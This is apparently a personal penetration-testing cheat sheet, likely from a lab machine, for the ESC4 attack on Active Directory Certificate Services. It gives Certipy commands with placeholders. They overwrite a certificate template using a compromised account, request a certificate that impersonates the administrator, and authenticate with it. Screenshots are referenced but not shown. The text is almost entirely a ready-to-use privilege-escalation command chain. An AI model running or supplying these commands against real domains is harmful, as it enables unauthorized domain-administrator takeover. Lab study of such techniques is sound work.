[https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4)
  
certipy-ad template -u <compromised_user>@<DOMAIN> -p <pass> -template <template_name> -dc-ip <IP> -save-old
- template_name can be found in certipy find output
![image 413.png](../../assets/ESC4/image%20413.png)
  
certipy-ad req -u <compromised_user>@<DOMAIN> -p <pass> -dc-ip <IP> -target <DOMAIN_NETBIOS> -ca <ca_name> -template <template_name> -upn administrator@<DOMAIN>
- example DomainNETBIOS: DC01.sequel.htb
- ca_name can be found in certipy find output
    
    - same with template_name
    
![image 1 308.png](../../assets/ESC4/image%201%20308.png)
  
certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
![image 2 259.png](../../assets/ESC4/image%202%20259.png)
  
![image 3 221.png](../../assets/ESC4/image%203%20221.png)
![image 4 192.png](../../assets/ESC4/image%204%20192.png)